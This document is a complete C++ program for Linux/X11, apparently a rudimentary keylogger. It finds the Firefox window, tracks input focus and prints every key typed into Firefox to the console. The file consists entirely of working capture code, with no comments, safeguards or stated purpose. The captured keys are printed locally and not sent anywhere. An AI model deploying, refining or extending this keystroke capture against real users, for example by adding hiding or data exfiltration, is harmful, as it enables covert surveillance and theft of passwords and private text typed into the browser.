#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <iostream>
#include <unistd.h>
#include <X11/Xatom.h>
#include <string.h>
using namespace std;


string WINDOWS_FIREFOX = "Mozilla Firefox";

Window *list (Display *disp, unsigned long *len) {
    Atom prop = XInternAtom(disp,"_NET_CLIENT_LIST",False), type;
    int form;
    unsigned long remain;
    unsigned char *list;
    if (XGetWindowProperty(disp,XDefaultRootWindow(disp),prop,0,1024,False,XA_WINDOW,
                &type,&form,len,&remain,&list) != Success) {
        return 0;
    }
    return (Window*)list;
}


char *name (Display *disp, Window win) {
    Atom prop = XInternAtom(disp,"WM_NAME",False), type;
    int form;
    unsigned long remain, len;
    unsigned char *list;
    if (XGetWindowProperty(disp,win,prop,0,1024,False,AnyPropertyType,
                &type,&form,&len,&remain,&list) != Success) {
        return strdup("Root");
    }
    return (char*)list;
}



int main(int argc, char* argv[]){
    int i;
    unsigned long len;
    XKeyEvent esend;
    Display *disp = XOpenDisplay(NULL);
    Window *listT;
    Window firefoxWindow = -1; 
    Window activeWindow = -1;
    Window oldWindow = -1;
    char *nameT;
    char* active;
    listT = (Window*)list(disp,&len);
    for (i=0;i<(int)len;i++) {
        nameT = name(disp,listT[i]);
        string nameTAsString(nameT);
        if (nameTAsString.find(WINDOWS_FIREFOX) != std::string::npos) {
            firefoxWindow = listT[i];
        }
    }
    if (firefoxWindow != -1) {
        char buf[17];
        KeySym ks;
        XComposeStatus comp;
        int len;
        int revert;
        string activeName;
        Window root = DefaultRootWindow(disp);
        XGetInputFocus (disp, &activeWindow, &revert);
        XSelectInput(disp, activeWindow, KeyPressMask|KeyReleaseMask|FocusChangeMask);
        active = name(disp, activeWindow);
        while (1) {
            XEvent ev;
            XNextEvent(disp, &ev);
            switch (ev.type) {
                case FocusOut: 
                {
                    oldWindow = activeWindow;
                    if (activeWindow != root)
                        XSelectInput(disp, activeWindow, 0);
                    XGetInputFocus (disp, &activeWindow, &revert);
                    if (name(disp,activeWindow) != NULL){
                        cout << "Focus changed!" << endl;
                        cout << "Old focus is " ;
                        if (active != NULL) cout<<string(active);
                        cout<<endl;
                        cout << "New focus is " ;
                        active = name(disp,activeWindow);
                        cout<<string(active);
                        cout<<endl;
                    }
                    if (activeWindow == PointerRoot) {
                        activeWindow = root;
                    }
                    XSelectInput(disp, activeWindow, KeyPressMask|KeyReleaseMask|FocusChangeMask);
                    break;
                }

                case KeyPress: 
                {
                    if (active != NULL){
                        activeName = string(active);
                        if (activeName.find(WINDOWS_FIREFOX) != std::string::npos){
                            len = XLookupString(&ev.xkey, buf, 16, &ks, &comp);
                            if (len > 0 && isprint(buf[0])) {
                                buf[len]=0;
                                cout << "Keypressed: " << buf << endl;
                            }
                            else {
                                cout << "Keycode: " << (int)ks << endl;
                            }
                        }
                    }
                }
            }
        }
    } else {
        cout << "Not found!" << endl;
    }
    
}